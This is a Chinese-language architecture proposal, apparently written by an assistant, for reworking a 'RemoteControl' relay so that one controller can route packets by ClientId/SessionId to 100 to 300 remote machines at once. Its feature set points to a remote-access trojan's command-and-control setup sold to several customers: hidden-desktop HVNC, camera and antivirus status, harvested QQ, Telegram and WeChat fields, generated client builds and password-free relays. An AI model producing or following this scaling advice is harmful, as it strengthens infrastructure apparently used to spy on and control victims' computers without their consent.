# 连接优化方案：去掉 SelectClient / BoundClient 依赖，改成包级路由

## 结论

当前 Relay 架构不适合 100 到 300 台客户机在线后再同时操作多台客户机。

问题不在于控制端共享一个 `_relaySocket`，共享一个物理连接本身可以成立；真正的问题是“目标客户机”被放在 Relay/控制端连接的可变状态里：

```text
Controller _relaySocket -> 当前 BoundClient -> 转发
```

只要 UI 打开多个窗口、多个虚拟 `SocketSession` 并发发包，或者用户在上一个操作响应回来前切换了树节点，`BoundClient` / `_currentClientId` 就可能已经变成另一台客户机，后续包就会发错、收错或被丢弃。

推荐把目标从“连接状态”改成“每个包自己的路由字段”：

```text
Controller _relaySocket -> RelayFrame.ClientId / SessionId -> 查表 -> 转发
```

也就是说：可以继续共享底层 socket，但每个虚拟客户机必须有自己的 `ClientId` / `SessionId`，每个请求包和响应包都必须携带路由信息，不能再靠 `SelectClient` 切换全局目标。

## 100 到 300 人规模判断

如果正常在线规模是 100 到 300 台客户机，这不是 Relay 网络层的极限规模，现有 async accept、socket keepalive、64 KB 缓冲和发送串行化思路基本够用。真正需要优先解决的是路由正确性，不是先堆复杂集群。

这个规模下建议优先级：

1. 必须做：`ClientId` 包级路由，彻底让普通业务包脱离 `SelectClient + BoundClient`。
2. 必须做：控制端共享 `_relaySocket` 的发送串行化，所有 Relay 外层包走同一个发送入口。
3. 必须做：控制端收包按 `ClientId` 分发，不能再用 `_currentClientId` 猜响应来源。
4. 应该做：生成客户端时写入稳定 `ClientId`，避免客户机重连后列表身份变化。
5. 可以后做：`SessionId` / `RequestId` / `StreamId` 完整化，用于同一客户机多窗口、多功能流并发。

换句话说，100 到 300 台客户机场景不需要第一步就改成很重的多 Relay 架构；先把“每个包带目标客户机”做好，就能解决当前最容易出错的串包、丢包和误路由问题。

需要单独注意的是高流量功能。100 到 300 台客户机在线不等于 100 到 300 路屏幕/HVNC同时拉流。如果同时打开大量屏幕、摄像头、HVNC、文件传输，瓶颈会变成带宽、JSON/base64 编码开销、UI 渲染和单控制端处理能力。建议把并发高流量窗口限制在实际运维需要的数量，例如只允许少量客户机同时实时拉流，其余客户机保持在线列表和低频命令通道。

## 当前项目里已经确认的现状

代码路径：

- Relay 服务：`RemoteControl.Relay/`
- 控制端 Relay 连接：`RemoteControl.Server/RemoteControlServer*.cs`
- 虚拟客户机会话：`RemoteControl.Server/RemoteControlServer.ClientSessions.cs`
- 共享发送对象：`RemoteControl.Protocals/Codec/SocketSession.cs`
- Relay 协议模型：`RemoteControl.Protocals/Relay/`

当前流程：

1. 客户端连接 Relay 后发送 `CYCLER_RELAY_HANDSHAKE`，`Role = "client"`。
2. 控制端连接 Relay 后发送 `CYCLER_RELAY_HANDSHAKE`，`Role = "controller"`。
3. Relay 用 `ClientSession.SessionId` 生成客户机在线 ID，并把客户机放进 `_clients`。
4. 控制端收到客户机列表后，为每个客户机创建一个虚拟 `SocketSession(info.ClientId, _relaySocket)`。
5. 这些虚拟 `SocketSession` 全部共享同一个 `_relaySocket`。
6. UI 通过 `SelectClient(clientId)` 发送 `CYCLER_RELAY_SELECT_CLIENT`。
7. Relay 把控制端连接上的 `BoundClient` 改成目标客户机。
8. 之后控制端发出的普通业务包会被 Relay 转发给当前 `BoundClient`。
9. 客户机回包时，Relay 通过客户机上的 `BoundController` 发回控制端。
10. 控制端收到普通业务回包后，不知道这个包来自哪台客户机，只能用 `_currentClientId` 或“只有一个虚拟客户机”的 fallback 来派发。

当前风险点：

- `BoundClient` 是控制端连接上的单字段，只能同时绑定一台客户机。
- `_currentClientId` 是控制端进程里的单字段，不能表达多个窗口、多个客户机并发响应。
- `SocketSession.Send` 直接对共享 socket 调用 `Socket.Send`，多个虚拟会话并发写入时缺少统一发送队列或锁。
- Relay 端 `ClientSession.SendRawAsync` 已经有 `SemaphoreSlim` 串行发送，但控制端共享 `_relaySocket` 的发送路径还没有同等级保护。
- `CYCLER_RELAY_FORWARD` / `CYCLER_RELAY_CLIENT_DATA` 已经在 `ePacketType` 中预留，但当前核心转发仍然走裸业务包 + `BoundClient`。

## 命名必须先理清

现有 `ClientSession.SessionId` 容易和推荐方案里的逻辑会话混淆。建议后续按下面三个概念拆开：

```text
ConnectionId
    Relay 为每条物理 TCP 连接生成的 ID。
    断线重连会变化，只能用于连接生命周期管理。

ClientId
    某个生成客户端/某台客户机的稳定 ID。
    应由生成客户端时写入，或者首次运行后持久化。
    客户机重连后仍应保持不变。

RouteSessionId / ControlSessionId
    控制端和某台客户机之间的一次逻辑控制会话 ID。
    用于包路由、响应归属、多窗口和多流量通道。
```

当前 `_clients` 里用 `ClientSession.SessionId` 当 `ClientId`，短期能用，但它是连接 ID，不是稳定客户机 ID。大量客户场景下，建议生成客户端时写入稳定 `ClientId`，并在握手包带上。

## 免密连接约束

你们当前服务器是免密连接，本方案不要求引入登录密码，也不把 `token` 作为必填字段。

建议握手字段改成“路由与归属信息”为主：

```csharp
public class RelayHandshake
{
    public string Role = "";        // client / controller
    public string ClientId = "";    // 客户机稳定 ID，仅 client 填
    public string CustomerId = "";  // 客户/租户/项目标识，仅用于归类和过滤
    public string InstallId = "";   // 单次安装标识，可与 ClientId 相同
    public string BuildId = "";     // 生成批次，便于排查

    // 保留现有字段
    public string HostName = "";
    public string AppPath = "";
    public string OnlineAvatar = "";
    public string UserName = "";
    public string LocalIP = "";
    public string OSVersion = "";
    public string Privilege = "";
    public string CameraStatus = "";
    public string Antivirus = "";
    public string OnlineQQ = "";
    public string TG = "";
    public string WX = "";
    public string UserStatus = "";
    public string Region = "";
    public string ISP = "";
}
```

注意：在免密模式下，`CustomerId` 只能用于列表分组、过滤和路由归属，不能当作安全边界。只要所有控制端都能免密连同一个 Relay，理论上它们就能看到同一个 Relay 上的客户机。真正隔离客户时，至少需要采用以下一种方式：

- 不同客户使用不同 Relay 实例、IP 或端口。
- Relay 按部署环境只暴露给内部控制端网络。
- 后续再加可选的控制端白名单、签名或一次性部署密钥。

第一阶段可以保持免密，但文档和实现里不要把 `CustomerId` 写成“权限已验证”。

## 推荐目标模型

一个控制端可以只有一个物理连接：

```text
ControllerSocket
    ├── RouteSession S1 -> ClientId A -> ClientConnection A
    ├── RouteSession S2 -> ClientId B -> ClientConnection B
    ├── RouteSession S3 -> ClientId C -> ClientConnection C
    └── RouteSession S4 -> ClientId D -> ClientConnection D
```

每个虚拟客户机对象不再共享“会变目标”的 `_relaySocket` 状态，而是共享底层传输，并持有自己的路由 ID：

```text
VirtualClient A: ClientId=A, SessionId=S1
VirtualClient B: ClientId=B, SessionId=S2
VirtualClient C: ClientId=C, SessionId=S3
```

## 最小可落地改造：先做 ClientId 包级路由

如果希望先解决“很多客户机共享一个 `_relaySocket` 发错包”的问题，第一阶段可以不强制客户端理解 `SessionId`，先把控制端到 Relay、Relay 到控制端的包改成带 `ClientId` 的封装帧。

新增统一转发包：

```csharp
public class RelayDataFrame
{
    public string ClientId = "";
    public string SessionId = "";       // 第一阶段可为空，第二阶段启用
    public string RequestId = "";       // 第一阶段可为空，第二阶段启用
    public int StreamId = 0;             // 第一阶段可为 0
    public ePacketType InnerPacketType;  // 原始业务包类型
    public byte[] Payload;               // 原始完整业务包，包含长度和 packetType
}
```

控制端发送：

```text
VirtualClient(ClientId=A).Send(PACKET_XXX)
    -> Encode 原始业务包
    -> 包装成 RelayDataFrame { ClientId = A, Payload = 原始业务包 }
    -> 通过共享 _relaySocket 发给 Relay
```

Relay 转发给客户机：

```text
收到 RelayDataFrame
    -> clientsById[frame.ClientId]
    -> SendRaw(frame.Payload)
```

客户机暂时仍然收原始业务包，不需要立刻改客户端收包逻辑。

客户机回包：

```text
客户机发送原始业务响应包
    -> Relay 知道来源连接属于 ClientId=A
    -> Relay 包装成 RelayDataFrame { ClientId = A, Payload = 原始响应包 }
    -> 发给控制端
```

控制端收包：

```text
收到 RelayDataFrame
    -> virtualClients[frame.ClientId]
    -> Decode frame.Payload
    -> PacketReceived.Session = 对应虚拟 SocketSession
```

这样就不再需要 `_currentClientId` 来猜测响应归属，也不需要每次操作前 `SelectClient`。

第一阶段限制：

- 可以稳定支持多个客户机并发操作。
- 不能彻底解决“同一客户机同时打开多个独立窗口/多个相同响应类型”的归属问题。
- 如果同一客户机内要同时跑多个屏幕、文件、HVNC、命令通道，仍建议进入第二阶段和第三阶段。

## 最终方案：SessionId / RequestId / StreamId 端到端路由

最终应让每个数据包带完整路由字段：

```csharp
public class RelayFrame
{
    public string SessionId = "";        // 控制端和客户机之间的逻辑会话
    public string ClientId = "";         // 目标客户机稳定 ID
    public string RequestId = "";        // 单次请求 ID，用于响应匹配
    public int StreamId = 0;             // 具体功能通道
    public ePacketType InnerPacketType;  // 原始业务包类型
    public byte[] Payload;               // 原始业务包或业务 payload
}
```

字段含义：

```text
ClientId
    目标客户机，解决“包应该发给哪台机器”。

SessionId
    控制端和客户机之间的一次逻辑控制会话，解决“属于哪个虚拟客户机/哪个窗口”。

RequestId
    单次请求-响应匹配，解决异步响应归属。

StreamId
    同一个 Session 里的功能通道，例如屏幕、文件、HVNC、剪贴板、命令。

Payload
    原始业务数据。第一阶段建议直接放完整旧业务包，降低改造面。
```

示例：

```text
Session S1 -> Client A
    ├── Stream 1: 鼠标键盘
    ├── Stream 2: 屏幕画面
    ├── Stream 3: 文件传输
    └── Stream 4: HVNC / 其他实时通道
```

## Relay 端改造

不要继续在控制端连接上保存单个 `BoundClient`。

当前近似结构：

```csharp
public class ClientSession
{
    public string SessionId { get; private set; }
    public ClientSession BoundController { get; set; }
    public ClientSession BoundClient { get; set; }
}
```

建议改成全局路由表：

```csharp
ConcurrentDictionary<string, ClientConnection> ClientsById;
ConcurrentDictionary<string, ControllerConnection> ControllersById;
ConcurrentDictionary<string, RelayRouteSession> SessionsById;
```

逻辑会话模型：

```csharp
public class RelayRouteSession
{
    public string SessionId = "";
    public string ClientId = "";
    public string ControllerId = "";
    public ClientSession Controller;
    public ClientSession Client;
    public DateTime CreatedAtUtc = DateTime.UtcNow;
    public DateTime LastSeenUtc = DateTime.UtcNow;
}
```

Relay 处理控制端数据：

```csharp
RelayFrame frame = DecodeRelayFrame(packet);

RelayRouteSession route;
if (!SessionsById.TryGetValue(frame.SessionId, out route))
{
    RejectOrLog("unknown session");
    return;
}

if (route.Controller != currentConnection)
{
    RejectOrLog("controller mismatch");
    return;
}

route.Client.SendRaw(frame.Payload);
```

Relay 处理客户机数据：

```csharp
// 第一阶段：按来源客户机 ClientId 包装响应
RelayFrame frame = new RelayFrame();
frame.ClientId = currentClient.ClientId;
frame.SessionId = ResolveSessionIdForClient(currentClient.ClientId);
frame.Payload = rawClientPacket;

route.Controller.SendRaw(EncodeRelayFrame(frame));
```

最终阶段客户机也理解 `RelayFrame` 时，客户机回包直接带回 `SessionId` / `RequestId` / `StreamId`，Relay 只按这些字段查表转发。

Relay 断开清理：

- 客户机断开时，移除 `ClientsById[clientId]`。
- 关闭所有指向该 `ClientId` 的 `RelayRouteSession`。
- 给相关控制端发送客户机离线和 session closed 通知。
- 控制端断开时，移除该控制端拥有的所有 `RelayRouteSession`。

## 控制端改造

控制端不能再依赖 `_currentClientId` 做普通业务包响应分发。

当前 `ProcessPacket` 的普通业务包分发逻辑大意是：

```text
如果 _currentClientId 存在，就把包派给 _virtualClients[_currentClientId]
否则只有一个虚拟客户机时 fallback
否则丢弃
```

应改成：

```text
收到 RelayFrame
    -> 根据 frame.SessionId 或 frame.ClientId 找虚拟客户机
    -> Decode frame.Payload 得到原始 packetType / obj
    -> PacketReceived.Session = 该虚拟客户机
    -> 触发现有 UI handler
```

虚拟客户机对象必须持有自己的路由字段：

```csharp
public class VirtualClientRoute
{
    public string ClientId = "";
    public string SessionId = "";
    public string CustomerId = "";
}
```

### 保持现有 UI 代码的推荐做法

现在 WinForms 代码里大量调用：

```csharp
oSession.Send(ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST, req);
currentSession.Send(ePacketType.PACKET_GET_PROCESSES_REQUEST, req);
```

如果直接要求所有 UI 改成 `relay.Send(session, packetType, obj)`，漏改风险很高。

更稳妥的方式是在 `SocketSession` 增加一个可选发送代理或传输接口：

```csharp
public interface ISessionTransport
{
    void Send(SocketSession session, ePacketType packetType, object obj);
}
```

`SocketSession.Send` 里先判断是否有自定义 transport：

```csharp
if (Transport != null)
{
    Transport.Send(this, packetType, obj);
    return;
}

SocketObj.Send(CodecFactory.Instance.EncodeOject(packetType, obj));
```

普通直连会话继续走 `SocketObj.Send`。Relay 虚拟会话设置 `Transport = RelayTransport`，现有 UI 大部分代码不用改，所有 `session.Send(...)` 都会自动带上对应 `ClientId` / `SessionId`。

注意：`SocketSession.Send` 当前不是 `virtual`，不要只靠子类 override；如果要保留现有调用点，应该改 `SocketSession` 本身或引入接口字段。

## 控制端 socket 写入必须串行化

多个虚拟客户机共享 `_relaySocket` 时，不能让多个线程直接并发 `Socket.Send`。

否则可能出现帧交错：

```text
ClientA frame 前半段
ClientB frame 前半段
ClientA frame 后半段
ClientB frame 后半段
```

Relay 端已经用 `SemaphoreSlim` 串行发送。控制端也需要同类机制。

因为 `RemoteControl.Server` 和 `RemoteControl.Protocals` 目标是 .NET Framework 4.0，不建议在控制端直接使用 `System.Threading.Channels`。可以选下面任一种：

1. 最小方案：在共享 `_relaySocket` 的完整编码包发送前加同一个 `lock`，保证一次写完整包。
2. 更稳方案：用 `BlockingCollection<byte[]>` 或 `Queue<byte[]> + AutoResetEvent` 做单写线程。

控制端发送队列结构：

```text
多个虚拟客户机
    -> RelaySendQueue
    -> 单一 WriteLoop
    -> _relaySocket
```

重点是：所有要写入 `_relaySocket` 的地方，包括心跳、客户机列表请求、OpenSession、业务 RelayFrame，都必须走同一个发送入口。

## 控制端 socket 读取必须统一分发

共享一个 `_relaySocket` 没问题，但只能有一个读取循环。

正确结构：

```text
一个 _relaySocket ReadLoop
    -> 解析完整外层包
    -> 如果是 Relay 管理包，更新客户机列表/session 状态
    -> 如果是 RelayFrame，按 ClientId / SessionId 找虚拟客户机
    -> Decode 内层业务包
    -> 触发现有 PacketReceived
```

不能让每个虚拟客户机对象自己去读同一个 socket，否则某个对象会读走另一个对象的包。

## 客户端改造

第一阶段可以不改客户机业务处理：客户机仍然接收原始业务包，响应原始业务包。Relay 根据“来源客户机连接”把响应包包上一层 `ClientId` 发回控制端。

但最终要支持同一客户机多窗口、多通道、请求响应精确匹配时，客户机也必须理解外层 `RelayFrame`：

```text
客户机收到 RelayFrame
    -> 取出 Payload
    -> 按现有 handlers 执行业务
    -> 回包时带回同一个 SessionId / RequestId / StreamId
```

这样同一台客户机内部也能区分：

- 屏幕流
- 文件传输
- HVNC
- 剪贴板
- 其他长连接或高频响应通道

## 协议包类型建议

当前 `ePacketType` 已有：

```text
200 CYCLER_RELAY_HANDSHAKE
201 CYCLER_RELAY_CLIENT_LIST_REQUEST
202 CYCLER_RELAY_CLIENT_LIST_RESPONSE
203 CYCLER_RELAY_SELECT_CLIENT
204 CYCLER_RELAY_CLIENT_ONLINE
205 CYCLER_RELAY_CLIENT_OFFLINE
206 CYCLER_RELAY_FORWARD
207 CYCLER_RELAY_CLIENT_DATA
```

建议：

- 保留 `203 CYCLER_RELAY_SELECT_CLIENT` 作为旧协议兼容，不再让新 UI 路径依赖它。
- 使用或重命名 `206/207` 承载 `RelayDataFrame`。
- 如果要更清晰，可以新增：

```text
206 CYCLER_RELAY_OPEN_SESSION
207 CYCLER_RELAY_SESSION_OPENED
208 CYCLER_RELAY_DATA
209 CYCLER_RELAY_CLOSE_SESSION
210 CYCLER_RELAY_SESSION_CLOSED
211 CYCLER_RELAY_ERROR
```

第一阶段只需要 `CYCLER_RELAY_DATA` 也能解决主要串包问题。第二阶段再加入 `OPEN_SESSION` / `CLOSE_SESSION`。

## 分阶段落地路线

### 第一阶段：去掉发包前 SelectClient 依赖

目标：多个客户机并发操作时不发错目标。

改动：

- `RelayHandshake` 增加 `ClientId` / `CustomerId` / `InstallId`，但不要求密码。
- 控制端虚拟 `SocketSession` 保存 `ClientId`。
- 控制端 `SocketSession.Send` 对 Relay 虚拟会话走 `RelayDataFrame`。
- Relay 收到 `RelayDataFrame.ClientId` 后直接查 `_clients[clientId]` 转发。
- Relay 客户机回包时包上 `ClientId` 发给控制端。
- 控制端 `ProcessPacket` 不再用 `_currentClientId` 猜普通业务包来源。

这一阶段完成后，`SelectClient` 可以只作为旧协议 fallback，不再是每次操作的必要前置步骤。

### 第二阶段：加入 RouteSessionId

目标：控制端可为每台客户机建立逻辑会话，响应能绑定到具体虚拟对象。

改动：

- 控制端首次操作客户机时发送 `OpenSession(ClientId)`。
- Relay 创建 `RelayRouteSession`，返回 `SessionId`。
- 虚拟客户机保存 `SessionId`。
- 后续 `RelayDataFrame` 同时带 `ClientId` 和 `SessionId`。
- Relay 用 `SessionsById[SessionId]` 校验 controller/client 关系。

### 第三阶段：RequestId / StreamId 端到端

目标：同一客户机内多窗口、多高流量功能稳定并发。

改动：

- 客户机理解外层 `RelayFrame`。
- 客户机回包带回同一个 `SessionId` / `RequestId` / `StreamId`。
- 控制端按 `StreamId` 分发屏幕、文件、HVNC 等通道。
- 屏幕和文件等大数据可再从 JSON/base64 帧升级为二进制外层帧，减少额外开销。

## 迁移注意事项

- `RemoteControl.Relay/deploy.sh` 内有一份复制出来的 Relay 源码片段；如果后续真改 Relay 代码，要同步更新或去掉这类重复源，避免部署脚本生成旧逻辑。
- `RemoteControl.Protocals` 是 .NET Framework 4.0 共享库，示例代码不要使用 C# 9 的 `init`、target-typed `new()` 或只在新框架可用的 API。
- 如果保留旧客户机兼容，Relay 需要能同时识别旧裸包路径和新 `RelayDataFrame` 路径；新控制端默认走新路径。
- `ClientId` 不应只用 Relay 当前连接生成的随机 ID。生成客户端时写入稳定 ID，或首次运行生成后持久化，是大量客户部署的关键。
- 免密模式下不要在文档里写“Relay 检查权限后创建会话”，除非后续真的加了权限校验。更准确的说法是“Relay 检查目标客户机在线、连接关系有效后创建会话”。

## 验收标准

至少验证这些场景：

1. 控制端连接 Relay 后能看到多台客户机在线。
2. 同时对 Client A 和 Client B 发送不同请求，Relay 不需要 `SelectClient` 也能发到正确客户机。
3. Client A 的响应不会因为当前树节点切到 Client B 而被派发给 B。
4. 同时打开 Client A 屏幕和 Client B 屏幕，两个窗口各自只收到自己的帧。
5. 多个 UI 窗口并发发送时，共享 `_relaySocket` 没有帧长度错误、JSON 解码错误或半包交错。
6. 客户机断线后，对应 `ClientId` 和 `SessionId` 都被清理，控制端不会继续向旧路由发包。
7. Relay 重连后，客户机稳定 `ClientId` 不变化，控制端列表不会把同一安装误认为全新客户机。

## 不建议继续采用的临时修补

不建议继续扩大下面这些做法：

- 每次操作前手动 `SelectClient`。
- 在更多菜单项里补 `SelectClient(currentSession.SocketId)`。
- 控制端响应分发继续依赖 `_currentClientId`。
- 多窗口场景下用“只有一个 handler 时 fallback”作为主要路由逻辑。
- 给每个虚拟客户机各自启动读取同一个 `_relaySocket` 的线程。

这些只能降低单一操作路径的出错概率，不能解决并发和异步响应的根因。

## 最终一句话

把“目标客户机”从 `_relaySocket` / `BoundClient` 的可变状态，改成每个数据包自己的 `ClientId` / `SessionId` 路由字段。这样即使控制端只有一个 Relay 物理连接，也能稳定区分很多客户、很多客户机、很多虚拟会话的包应该发给谁、回给谁。
